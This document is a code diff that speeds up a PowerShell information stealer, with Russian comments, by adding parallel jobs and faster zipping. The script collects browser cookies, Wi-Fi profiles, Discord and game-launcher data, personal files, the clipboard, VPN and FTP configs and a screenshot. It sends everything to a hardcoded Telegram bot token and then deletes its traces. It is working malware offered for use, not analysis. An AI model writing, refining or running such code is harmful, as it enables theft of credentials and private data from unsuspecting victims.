@@ -18,6 +18,9 @@ $messages = @{
 $BotToken = "8432230669:AAGsKeVpDl9nKqUuHUfciRxrGYdIGQ01b6I"
 $ChatID = "1266539824"
 
+# Добавляем .NET библиотеки для быстрой архивации
+Add-Type -Assembly System.IO.Compression.FileSystem
+
 function WriteMsg($key) { Write-Host $messages[$key] }
 
 # --- Деление больших файлов (если архив > лимита Telegram) ---
@@ -77,7 +80,7 @@ function Send-ResultToTelegram {
     } catch { return $false }
 }
 
-# --- Сбор информации о системе, программ, Wi-Fi ---
+# --- Сбор информации о системе, программ, Wi-Fi (ОПТИМИЗИРОВАНО) ---
 function Get-SystemInfo {
     param($OutDirectory)
     New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
@@ -85,9 +88,20 @@ function Get-SystemInfo {
     $externalIp = try { (Invoke-RestMethod -Uri 'https://api.ipify.org').Trim() } catch { "N/A" }
     $userInfo = "Username: $($env:USERNAME)"+"`r`n"+"ComputerName: $($env:COMPUTERNAME)"+"`r`n"+"Local IP: $($ipConfig.IPAddress -join ', ')"+"`r`n"+"External IP: $externalIp"
     $userInfo | Out-File "$OutDirectory\user_info.txt"
-    Get-ComputerInfo | Out-File "$OutDirectory\computer_info.txt"
+    
+    # ОПТИМИЗИРОВАНО: заменено Get-ComputerInfo на целевой сбор
+    $sysInfo = @{
+        OS = (Get-CimInstance Win32_OperatingSystem).Caption
+        Version = (Get-CimInstance Win32_OperatingSystem).Version
+        Architecture = $env:PROCESSOR_ARCHITECTURE
+        RAM_GB = [Math]::Round((Get-CimInstance Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
+        CPU = (Get-CimInstance Win32_Processor).Name
+    }
+    $sysInfo | Out-File "$OutDirectory\computer_info.txt"
+    
+    # ОПТИМИЗИРОВАНО: только реестр без Win32_Product
     Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | Select-Object DisplayName, DisplayVersion, Publisher, InstallDate | Format-Table –AutoSize | Out-File "$OutDirectory\installed_programs.txt"
-    Get-WmiObject -Class Win32_Product | Select-Object Name | Out-File -Append "$OutDirectory\installed_programs.txt"
+    
     try {
         $wifiProfiles = (netsh wlan show profiles) | Select-String ":(.+)$" | %{$_.Matches.Groups[1].Value.Trim()}
         $wifiData = foreach ($profile in $wifiProfiles) {
@@ -187,14 +201,21 @@ function Get-BrowserData {
     } catch { Add-Content "$OutDirectory\Cookies\errors.txt" $_.Exception.Message }
 }
 
-# --- Сбор файлов, без системных, больших и временных ---
-function Gather-Files { param($OutDirectory)
+# --- Сбор файлов, без системных, больших и временных (ОПТИМИЗИРОВАНО) ---
+function Gather-Files { 
+    param($OutDirectory)
     New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
     $userDirs = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads")
     foreach ($dir in $userDirs) {
         if (Test-Path $dir) {
+            # ОПТИМИЗИРОВАНО: исключены кеши браузеров
             Get-ChildItem -Path $dir -File -Recurse -ErrorAction SilentlyContinue |
-                Where-Object { $_.Length -lt 20MB -and $_.Attributes -notmatch "System" -and $_.Name -notmatch "(?:pagefile|swapfile|\\.tmp$|\\.log$)" } | foreach {
+                Where-Object { 
+                    $_.Length -lt 20MB -and 
+                    $_.Attributes -notmatch "System" -and 
+                    $_.Name -notmatch "(?:pagefile|swapfile|\.tmp$|\.log$)" -and
+                    $_.FullName -notmatch "\\Cache\\|\\Code Cache\\|\\GPUCache\\|\\Service Worker\\|\\Local Storage\\|\\Session Storage\\"
+                } | foreach {
                 try {
                     Copy-Item $_.FullName -Destination "$OutDirectory\" -Force -ErrorAction Stop
                 } catch {
@@ -205,7 +226,8 @@ function Gather-Files { param($OutDirectory)
     }
 }
 
-function Get-GameLauncherData { param($OutDirectory)
+function Get-GameLauncherData { 
+    param($OutDirectory)
     New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
     $launcherPaths = @(
         "$env:PROGRAMFILES\Steam", "$env:APPDATA\EpicGamesLauncher", 
@@ -225,7 +247,8 @@ function Get-GameLauncherData { param($OutDirectory)
     }
 }
 
-function Get-MessengerData { param($OutDirectory)
+function Get-MessengerData { 
+    param($OutDirectory)
     New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
     $discordPaths = @("$env:APPDATA\discord", "$env:APPDATA\discordcanary", "$env:APPDATA\discordptb")
     foreach ($path in $discordPaths) {
@@ -251,7 +274,8 @@ function Get-MessengerData { param($OutDirectory)
     }
 }
 
-function Take-Screenshot { param($OutFile)
+function Take-Screenshot { 
+    param($OutFile)
     try {
         Add-Type -AssemblyName System.Windows.Forms
         $screen = [System.Windows.Forms.SystemInformation]::PrimaryMonitorSize
@@ -262,12 +286,16 @@ function Take-Screenshot { param($OutFile)
         $graphics.Dispose(); $bitmap.Dispose()
     } catch {}
 }
-function Get-UserActivity { param($OutDirectory)
+
+function Get-UserActivity { 
+    param($OutDirectory)
     New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
     try { Get-Clipboard | Out-File "$OutDirectory\clipboard.txt" } catch {}
     "[Keylogger] Не реализовано в Powershell." | Out-File "$OutDirectory\keylogger_status.txt"
 }
-function Get-VpnFtpData { param($OutDirectory)
+
+function Get-VpnFtpData { 
+    param($OutDirectory)
     New-Item -Path $OutDirectory -ItemType Directory -Force | Out-Null
     Get-ChildItem -Path $env:USERPROFILE -Recurse -Include *.ovpn, *.conf, *.ini -ErrorAction SilentlyContinue | foreach {
         try {
@@ -290,42 +318,89 @@ function Get-VpnFtpData { param($OutDirectory)
     }
 }
 
-# --- Улучшенная архивация только собранных данных по папкам ---
+# --- ОПТИМИЗИРОВАННАЯ функция выполнения с параллелизацией и быстрой архивацией ---
 function Start-Execution {
     WriteMsg "Start"
     $tempDir = "$env:TEMP\SystemData-$(Get-Random)"
     New-Item -Path $tempDir -ItemType Directory -Force | Out-Null
+    
+    # ОПТИМИЗИРОВАНО: параллельный сбор данных через Start-Job
+    $jobs = @()
+    
     WriteMsg "SystemCollect"
-    Get-SystemInfo -OutDirectory "$tempDir\System"
+    $jobs += Start-Job -ScriptBlock {
+        param($dir, $funcDef)
+        . ([ScriptBlock]::Create($funcDef))
+        Get-SystemInfo -OutDirectory "$dir\System"
+    } -ArgumentList $tempDir, ${function:Get-SystemInfo}.ToString()
+    
     WriteMsg "BrowsersCollect"
-    Get-BrowserData -OutDirectory "$tempDir\Browsers"
+    $jobs += Start-Job -ScriptBlock {
+        param($dir, $funcDef1, $funcDef2, $funcDef3, $funcDef4, $funcDef5)
+        . ([ScriptBlock]::Create($funcDef1))
+        . ([ScriptBlock]::Create($funcDef2))
+        . ([ScriptBlock]::Create($funcDef3))
+        . ([ScriptBlock]::Create($funcDef4))
+        . ([ScriptBlock]::Create($funcDef5))
+        Get-BrowserData -OutDirectory "$dir\Browsers"
+    } -ArgumentList $tempDir, ${function:Get-BrowserData}.ToString(), ${function:Get-AllChromiumCookies}.ToString(), ${function:Get-AllFirefoxCookies}.ToString(), ${function:Get-ChromiumCookies}.ToString(), ${function:Get-FirefoxCookies}.ToString()
+    
     WriteMsg "FilesCollect"
-    Gather-Files -OutDirectory "$tempDir\Files"
+    $jobs += Start-Job -ScriptBlock {
+        param($dir, $funcDef)
+        . ([ScriptBlock]::Create($funcDef))
+        Gather-Files -OutDirectory "$dir\Files"
+    } -ArgumentList $tempDir, ${function:Gather-Files}.ToString()
+    
     WriteMsg "GamingCollect"
-    Get-GameLauncherData -OutDirectory "$tempDir\Gaming"
+    $jobs += Start-Job -ScriptBlock {
+        param($dir, $funcDef)
+        . ([ScriptBlock]::Create($funcDef))
+        Get-GameLauncherData -OutDirectory "$dir\Gaming"
+    } -ArgumentList $tempDir, ${function:Get-GameLauncherData}.ToString()
+    
     WriteMsg "MessengersCollect"
-    Get-MessengerData -OutDirectory "$tempDir\Messengers"
+    $jobs += Start-Job -ScriptBlock {
+        param($dir, $funcDef)
+        . ([ScriptBlock]::Create($funcDef))
+        Get-MessengerData -OutDirectory "$dir\Messengers"
+    } -ArgumentList $tempDir, ${function:Get-MessengerData}.ToString()
+    
+    WriteMsg "UserActivity"
+    $jobs += Start-Job -ScriptBlock {
+        param($dir, $funcDef)
+        . ([ScriptBlock]::Create($funcDef))
+        Get-UserActivity -OutDirectory "$dir\Activity"
+    } -ArgumentList $tempDir, ${function:Get-UserActivity}.ToString()
+    
+    WriteMsg "NetworkCollect"
+    $jobs += Start-Job -ScriptBlock {
+        param($dir, $funcDef)
+        . ([ScriptBlock]::Create($funcDef))
+        Get-VpnFtpData -OutDirectory "$dir\Network"
+    } -ArgumentList $tempDir, ${function:Get-VpnFtpData}.ToString()
+    
+    # Дожидаемся завершения всех задач
+    $jobs | Wait-Job | Receive-Job | Out-Null
+    $jobs | Remove-Job
+    
     WriteMsg "Screenshot"
     Take-Screenshot -OutFile "$tempDir\screenshot.png"
-    WriteMsg "UserActivity"
-    Get-UserActivity -OutDirectory "$tempDir\Activity"
-    WriteMsg "NetworkCollect"
-    Get-VpnFtpData -OutDirectory "$tempDir\Network"
+    
+    # ОПТИМИЗИРОВАНО: быстрая архивация через .NET API с уровнем Fastest
     WriteMsg "Archive"
-    # Архивация по собранным папкам (без мусора, больших и системных файлов)
-    $folders = @("System","Browsers","Files","Gaming","Messengers","Activity","Network")
-    $toArchive = @()
-    foreach ($folder in $folders) {
-        $fullPath = "$tempDir\$folder"
-        if (Test-Path $fullPath) {
-            $files = Get-ChildItem -Path $fullPath -File -Recurse -ErrorAction SilentlyContinue | Where-Object {
-                $_.Length -le 20MB -and $_.Attributes -notmatch "System" -and $_.Name -notmatch "(?:pagefile|swapfile|\\.tmp$|\\.log$|\\.ldb$|Cache|Code Cache|Service Worker|Local Storage|Session Storage)"
-            }
-            $toArchive += $files | Select-Object -ExpandProperty FullName
-        }
-    }
     $zipPath = "$env:TEMP\DataPackage-$(Get-Random).zip"
-    Compress-Archive -Path $toArchive -DestinationPath $zipPath -Force
+    
+    if (Test-Path $zipPath) { Remove-Item $zipPath -Force }
+    
+    # Используем прямой .NET API для максимальной скорости
+    [System.IO.Compression.ZipFile]::CreateFromDirectory(
+        $tempDir,
+        $zipPath,
+        [System.IO.Compression.CompressionLevel]::Fastest,
+        $false
+    )
+    
     $maxTelegramMB = 49
     $zipSizeMB = [Math]::Round((Get-Item $zipPath).Length / 1MB,2)
     WriteMsg "TelegramSend"
@@ -342,7 +417,7 @@ function Start-Execution {
         if ($allOk) { WriteMsg "Success" } else { WriteMsg "FailSend" }
     }
     Remove-Item -Path $tempDir -Recurse -Force -Confirm:$false
-    Remove-Item -Path $zipPath -Force
+    Remove-Item -Path $zipPath -Force -ErrorAction SilentlyContinue
     WriteMsg "Finished"
 }
 
